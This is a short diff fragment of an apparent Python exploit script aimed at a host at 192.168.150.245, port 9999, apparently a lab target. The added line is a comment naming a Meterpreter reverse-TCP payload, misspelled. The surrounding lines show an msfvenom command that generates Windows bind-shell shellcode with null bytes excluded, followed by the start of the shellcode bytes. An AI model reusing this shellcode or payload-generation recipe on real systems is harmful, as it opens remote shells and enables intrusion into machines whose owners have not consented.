@@ -124,7 +124,7 @@ import sys
 
 host = "192.168.150.245"
 port = 9999
-
+   #windows/meterprety/reverse_tcp lhost=XXXX lport=XXXX
 #msfvenom -p windows/shell_bind_tcp EXITFUNC=thread -b "\x00" -f c
 #payload size : 355 bytes
 shellcode = ("\xbd\x48\xb8\xaa\xe8\xd9\xce\xd9\x74\x24\xf4\x5e\x31\xc9\xb1"
